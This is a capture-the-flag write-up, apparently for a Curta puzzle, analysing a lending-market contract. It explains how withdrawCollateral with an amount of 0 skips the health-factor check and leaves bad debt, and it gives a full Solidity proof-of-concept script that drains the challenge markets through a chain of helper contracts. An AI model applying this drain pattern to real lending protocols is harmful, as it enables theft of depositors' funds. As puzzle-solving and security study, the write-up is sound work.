@@ -1,0 +1,376 @@
+---
+author: '0xd7FEe2Ed2a05124DCC440F2E3C13405157a4Fc48'
+contributors: ['0xd7FEe2Ed2a05124DCC440F2E3C13405157a4Fc48']
+adapted_from: 'https://twitter.com/windowhan/status/1767448685917421610'
+---
+
+## Overview
+
+The code below shows the conditions for solving the problem.
+Initially, users are given 10,000 (10,000 ether) curtaUSD tokens and 10,000 curtaWETH tokens. Using only the assets provided, you must exploit the contract's vulnerabilities to obtain an additional 10,000 curtaUSD and 20,000 curtaWETH Tokens.
+
+```sol showLineNumbers={false}
+function createChallenge(uint256 seed, address player) external onlyOwner returns (address) {
+    ...
+    CurtaToken(usdClone).mint(player, 10000 ether);
+    CurtaToken(wethClone).mint(player, 10000 ether);
+    ...
+}
+...
+function verify(uint256 seed, uint256) external view returns (bool) {
+    return instances[seed].isSolved();
+}
+...
+function isSolved() external view returns (bool) {
+    require(
+        curtaUSD.balanceOf(address(uint160(seed))) == 20000 ether
+        && curtaWETH.balanceOf(address(uint160(seed))) == 30000 ether
+    );
+    return true;
+}
+```
+
+Let's delve into how the problem environment is configured.
+A summary of the code documented in the image is as follows:
+- A total of 3 markets are created in the Lending Market: CurtaUSD, CurtaWETH, and CurtaRebasingWETH.
+- The Oracle records the price of CurtaUSD at 1e18, CurtaWETH at 3000e18, and CurtaRebasingWETH at 3100e18.
+- The interest rate for the CurtaUSD Lending Market is set at 5%, with a borrow LTV (Loan-to-Value) of 80%, a liquidation LTV of 90%, and a liquidation bonus of 5%.
+- The CurtaWETH Lending Market has an interest rate of 3%, a borrow LTV of 70%, a liquidation LTV of 80%, and a liquidation bonus of 5%.
+- The CurtaRebasingWETH Lending Market also features an interest rate of 3%, a borrow LTV of 70%, a liquidation LTV of 80%, and a liquidation bonus of 5%.
+- Each of the three markets initially has a liquidity of 10,000 units, and players are provided with 10,000 units of CurtaUSD and 10,000 units of CurtaWETH.
+
+```sol showLineNumbers={false}
+function createChallenge(uint256 seed, address player) external onlyOwner returns (address) {
+    address usdClone = Clones.clone(tokenImplementation);
+    address wethClone = Clones.clone(tokenImplementation);
+    address rebasingWETHClone = Clones.clone(rebasingTokenImplementation);
+    address oracleClone = Clones.clone(oracleImplementation);
+    address curtaLendingClone = Clones.clone(curtaLendingImplementation);
+    address challClone = Clones.clone(challengeImplementation);
+
+    CurtaToken(usdClone).initialize("CurtaUSD", "USD", address(this));
+    CurtaToken(wethClone).initialize("CurtaWETH", "WETH", address(this));
+    CurtaRebasingToken(rebasingWETHClone).initialize("CurtaRebasingWETH", "RebasingWETH", wethClone, address(this));
+    Oracle(oracleClone).initialize(address(this));
+    CurtaLending(curtaLendingClone).initialize(address(this), oracleClone);
+    Challenge(challClone).initialize(address(this), usdClone, wethClone, rebasingWETHClone, curtaLendingClone, seed);
+
+    Oracle(oracleClone).setPrice(usdClone, 1e18);
+    Oracle(oracleClone).setPrice(wethClone, 3000e18);
+    Oracle(oracleClone).setPrice(rebasingWETHClone, 3100e18);
+
+    CurtaLending(curtaLendingClone).setAsset(usdClone, true, 500, 0.8 ether, 0.9 ether, 0.05 ether);
+    CurtaLending(curtaLendingClone).setAsset(wethClone, true, 300, 0.7 ether, 0.8 ether, 0.05 ether);
+    CurtaLending(curtaLendingClone).setAsset(rebasingWETHClone, true, 300, 0.7 ether, 0.8 ether, 0.05 ether);
+
+    CurtaToken(usdClone).mint(address(this), 10000 ether);
+    CurtaToken(wethClone).mint(address(this), 20000 ether);
+    CurtaToken(wethClone).approve(rebasingWETHClone, 10000 ether);
+    CurtaRebasingToken(rebasingWETHClone).deposit(10000 ether);
+
+    CurtaToken(usdClone).mint(player, 10000 ether);
+    CurtaToken(wethClone).mint(player, 10000 ether);
+
+    CurtaToken(usdClone).approve(curtaLendingClone, 10000 ether);
+    CurtaLending(curtaLendingClone).depositLiquidity(usdClone, 10000 ether);
+    CurtaToken(wethClone).approve(curtaLendingClone, 10000 ether);
+    CurtaLending(curtaLendingClone).depositLiquidity(wethClone, 10000 ether);
+    CurtaRebasingToken(rebasingWETHClone).approve(curtaLendingClone, 10000 ether);
+    CurtaLending(curtaLendingClone).depositLiquidity(rebasingWETHClone, 10000 ether);
+
+    return challClone;
+}
+```
+
+
+## Solution
+
+The functions that users can call in the CurtaLending contract are as follows:
+- depositCollateral
+- withdrawCollateral
+- depositLiquidity
+- withdrawLiquidity
+- borrow
+- repay
+- liquidate
+- resetBorrowAsset
+- burnBadDebt
+- claimReward
+- accrueInterest
+- updateAsset
+
+By examining the code of the withdrawCollateral function, you can find suspicious code.
+
+```sol showLineNumbers={false}
+function withdrawCollateral(address asset, uint256 amount) external {
+    accrueInterest(msg.sender, asset);
+
+    UserInfo storage _userInfo = userInfo[msg.sender][asset];
+    AssetInfo storage _assetInfo = assetInfo[asset];
+
+    uint256 collateralValue = (_userInfo.collateralAmount - amount) * oracle.getPrice(asset);
+    uint256 borrowValue = _userInfo.totalDebt * oracle.getPrice(_userInfo.borrowAsset);
+    require(collateralValue * _assetInfo.borrowLTV >= borrowValue * 1e18);
+
+    if (amount == 0) {
+        _userInfo.liquidityAmount += _userInfo.collateralAmount;
+        _assetInfo.totalLiquidity += _userInfo.collateralAmount;
+        _assetInfo.avaliableLiquidity += _userInfo.collateralAmount;
+        _userInfo.collateralAmount = 0;
+    } else {
+        require(_userInfo.collateralAmount >= amount);
+        _userInfo.liquidityAmount += amount;
+        _userInfo.collateralAmount -= amount;
+        _assetInfo.totalLiquidity += amount;
+        _assetInfo.avaliableLiquidity += amount;
+    }
+}
+```
+
+Pay close attention to where the Health Factor is checked in the withdrawCollateral function.
+
+The formula used to calculate the value of the collateral by its quantity is `_userInfo.collateralAmount - amount`.
+
+However, when the amount is 0, it intends to withdraw all the collateral.
+
+This means that the health factor is calculated based on the state before the withdrawal of the collateral, allowing an attacker to bypass the code that checks if the position is healthy.
+
+Consequently, it leads to bad debt.
+
+I managed to solve the challenge by exploiting this vulnerability.
+
+
+## POC
+
+```sol fileName="Solve.s.sol"
+// SPDX-License-Identifier: UNLICENSED
+pragma solidity ^0.8.13;
+
+import {Script, console} from "forge-std/Script.sol";
+import "../src/lending/prob.sol";
+
+interface ICurta {
+    function solve(uint32 _puzzleId, uint256 _solution) external payable;
+}
+
+contract Helper {
+    CurtaToken public curtaUSD;
+    CurtaToken public curtaWETH;
+    CurtaRebasingToken public curtaRebasingWETH;
+    CurtaLending public lending;
+
+    constructor(CurtaToken _curtaUSD, CurtaToken _curtaWETH, CurtaRebasingToken _RebasingWETH, CurtaLending _lending) {
+        curtaUSD = _curtaUSD;
+        curtaWETH = _curtaWETH;
+        curtaRebasingWETH = _RebasingWETH;
+        lending = _lending;
+    }
+    function start() public {
+        curtaUSD.approve(address(lending), type(uint256).max);
+        curtaWETH.approve(address(lending), type(uint256).max);
+        lending.depositCollateral(address(curtaWETH), 10000 ether);
+        lending.borrow(address(curtaWETH), address(curtaWETH), 7000 ether);
+        lending.withdrawCollateral(address(curtaWETH), 0);
+        lending.withdrawLiquidity(address(curtaWETH), 10000 ether);
+
+
+        Helper2 helper = new Helper2(curtaUSD, curtaWETH, curtaRebasingWETH, lending);
+        curtaWETH.transfer(address(helper), 17000 ether);
+        curtaUSD.transfer(address(helper), 10000 ether);
+        helper.start();
+    }
+}
+
+contract Helper2 {
+    CurtaToken public curtaUSD;
+    CurtaToken public curtaWETH;
+    CurtaRebasingToken public curtaRebasingWETH;
+    CurtaLending public lending;
+
+    constructor(CurtaToken _curtaUSD, CurtaToken _curtaWETH, CurtaRebasingToken _RebasingWETH, CurtaLending _lending) {
+        curtaUSD = _curtaUSD;
+        curtaWETH = _curtaWETH;
+        curtaRebasingWETH = _RebasingWETH;
+        lending = _lending;
+    }
+
+    function start() public {
+        curtaUSD.approve(address(lending), type(uint256).max);
+        curtaWETH.approve(address(lending), type(uint256).max);
+        lending.depositCollateral(address(curtaWETH), 10000 ether);
+        lending.borrow(address(curtaWETH), address(curtaWETH), 3000 ether);
+        lending.withdrawCollateral(address(curtaWETH), 0);
+        lending.withdrawLiquidity(address(curtaWETH), 10000 ether);
+
+        Helper3 helper = new Helper3(curtaUSD, curtaWETH, curtaRebasingWETH, lending);
+        curtaWETH.transfer(address(helper), 20000 ether);
+        curtaUSD.transfer(address(helper), 10000 ether);
+        helper.start();
+    }
+}
+
+contract Helper3 {
+    CurtaToken public curtaUSD;
+    CurtaToken public curtaWETH;
+    CurtaRebasingToken public curtaRebasingWETH;
+    CurtaLending public lending;
+
+    constructor(CurtaToken _curtaUSD, CurtaToken _curtaWETH, CurtaRebasingToken _RebasingWETH, CurtaLending _lending) {
+        curtaUSD = _curtaUSD;
+        curtaWETH = _curtaWETH;
+        curtaRebasingWETH = _RebasingWETH;
+        lending = _lending;
+    }
+
+    function start() public {
+        curtaUSD.approve(address(lending), type(uint256).max);
+        curtaWETH.approve(address(lending), type(uint256).max);
+        lending.depositCollateral(address(curtaUSD), 10000 ether);
+        lending.borrow(address(curtaUSD), address(curtaUSD), 7000 ether);
+        lending.withdrawCollateral(address(curtaUSD), 0);
+        lending.withdrawLiquidity(address(curtaUSD), 10000 ether);
+
+
+        console.log("curtaWETH balance : %d", curtaWETH.balanceOf(address(this)));
+        console.log("curtaUSD balance : %d", curtaUSD.balanceOf(address(this)));
+        Helper4 helper = new Helper4(curtaUSD, curtaWETH, curtaRebasingWETH, lending);
+        curtaWETH.transfer(address(helper), 20000 ether);
+        curtaUSD.transfer(address(helper), 17000 ether);
+        helper.start();
+    }
+}
+
+
+contract Helper4 {
+    CurtaToken public curtaUSD;
+    CurtaToken public curtaWETH;
+    CurtaRebasingToken public curtaRebasingWETH;
+    CurtaLending public lending;
+
+    constructor(CurtaToken _curtaUSD, CurtaToken _curtaWETH, CurtaRebasingToken _RebasingWETH, CurtaLending _lending) {
+        curtaUSD = _curtaUSD;
+        curtaWETH = _curtaWETH;
+        curtaRebasingWETH = _RebasingWETH;
+        lending = _lending;
+    }
+
+    function start() public {
+        curtaUSD.approve(address(lending), type(uint256).max);
+        curtaWETH.approve(address(lending), type(uint256).max);
+        lending.depositCollateral(address(curtaUSD), 10000 ether);
+        lending.borrow(address(curtaUSD), address(curtaUSD), 3000 ether);
+        lending.withdrawCollateral(address(curtaUSD), 0);
+        lending.withdrawLiquidity(address(curtaUSD), 10000 ether);
+
+
+        console.log("curtaWETH balance : %d", curtaWETH.balanceOf(address(this)));
+        console.log("curtaUSD balance : %d", curtaUSD.balanceOf(address(this)));
+        Helper5 helper = new Helper5(curtaUSD, curtaWETH, curtaRebasingWETH, lending);
+        curtaWETH.transfer(address(helper), 20000 ether);
+        curtaUSD.transfer(address(helper), 20000 ether);
+        helper.start();
+    }
+}
+
+contract Helper5 {
+    CurtaToken public curtaUSD;
+    CurtaToken public curtaWETH;
+    CurtaRebasingToken public curtaRebasingWETH;
+    CurtaLending public lending;
+
+    constructor(CurtaToken _curtaUSD, CurtaToken _curtaWETH, CurtaRebasingToken _RebasingWETH, CurtaLending _lending) {
+        curtaUSD = _curtaUSD;
+        curtaWETH = _curtaWETH;
+        curtaRebasingWETH = _RebasingWETH;
+        lending = _lending;
+    }
+
+    function start() public {
+        curtaWETH.approve(address(curtaRebasingWETH), type(uint256).max);
+        curtaRebasingWETH.deposit(10000 ether);
+        curtaRebasingWETH.approve(address(lending), type(uint256).max);
+        lending.depositCollateral(address(curtaRebasingWETH), 10000 ether);
+        lending.borrow(address(curtaRebasingWETH), address(curtaRebasingWETH), 3000 ether);
+        lending.withdrawCollateral(address(curtaRebasingWETH), 0);
+        lending.withdrawLiquidity(address(curtaRebasingWETH), 10000 ether);
+
+        console.log("curtaWETH balance : %d", curtaWETH.balanceOf(address(this)));
+        console.log("curtaUSD balance : %d", curtaUSD.balanceOf(address(this)));
+        console.log("curtaRebalanceETH : %d", curtaRebasingWETH.balanceOf(address(this)));
+
+        Helper6 helper = new Helper6(curtaUSD, curtaWETH, curtaRebasingWETH, lending);
+        curtaWETH.transfer(address(helper), 10000 ether);
+        curtaUSD.transfer(address(helper), 20000 ether);
+        curtaRebasingWETH.transfer(address(helper), 13000 ether);
+        helper.start();
+    }
+}
+
+
+contract Helper6 {
+    CurtaToken public curtaUSD;
+    CurtaToken public curtaWETH;
+    CurtaRebasingToken public curtaRebasingWETH;
+    CurtaLending public lending;
+
+    constructor(CurtaToken _curtaUSD, CurtaToken _curtaWETH, CurtaRebasingToken _RebasingWETH, CurtaLending _lending) {
+        curtaUSD = _curtaUSD;
+        curtaWETH = _curtaWETH;
+        curtaRebasingWETH = _RebasingWETH;
+        lending = _lending;
+    }
+
+    function start() public {
+        //curtaWETH.approve(address(curtaRebasingWETH), type(uint256).max);
+        //curtaRebasingWETH.deposit(10000 ether);
+        curtaRebasingWETH.approve(address(lending), type(uint256).max);
+        lending.depositCollateral(address(curtaRebasingWETH), 10000 ether);
+        lending.borrow(address(curtaRebasingWETH), address(curtaRebasingWETH), 7000 ether);
+        lending.withdrawCollateral(address(curtaRebasingWETH), 0);
+        lending.withdrawLiquidity(address(curtaRebasingWETH), 10000 ether);
+        curtaRebasingWETH.withdraw(20000 ether);
+        curtaWETH.transfer(tx.origin, curtaWETH.balanceOf(address(this)));
+        curtaUSD.transfer(tx.origin, curtaUSD.balanceOf(address(this)));
+
+        console.log("curtaWETH balance : %d", curtaWETH.balanceOf(address(tx.origin)));
+        console.log("curtaUSD balance : %d", curtaUSD.balanceOf(address(tx.origin)));
+
+    }
+}
+
+
+contract CounterScript is Script {
+    address public prob = 0xc0894A610f48dc195FEbb409b55497b670D448d0;
+    function setUp() public {
+
+    }
+
+    function run() public {
+        vm.startBroadcast();
+        Challenge chall = Challenge(0x1cB78C2c27E377Ae4D9FfDA48192186B4b510074);
+        console.log("chall address : %s", address(chall));
+
+        CurtaToken curtaUSD = chall.curtaUSD();
+        CurtaToken curtaWETH = chall.curtaWETH();
+        CurtaRebasingToken curtaRebasingWETH = chall.curtaRebasingETH();
+        CurtaLending lending = chall.curtaLending();
+
+        /*Helper helper = new Helper(curtaUSD, curtaWETH, curtaRebasingWETH, lending);
+        curtaUSD.transfer(address(helper), 10000 ether);
+        curtaWETH.transfer(address(helper), 10000 ether);
+
+        helper.start();*/
+
+        address curta = 0x00000000D1329c5cd5386091066d49112e590969;
+        address target = 0x6a69c1d56bdF20202e47849D38437a71DFC78a39;
+
+        curtaUSD.transfer(address(target), 20000 ether);
+        curtaWETH.transfer(address(target), 30000 ether);
+
+        ICurta(curta).solve(7, 10);
+
+        //revert("end");
+        vm.stopBroadcast();
+    }
+}
+```
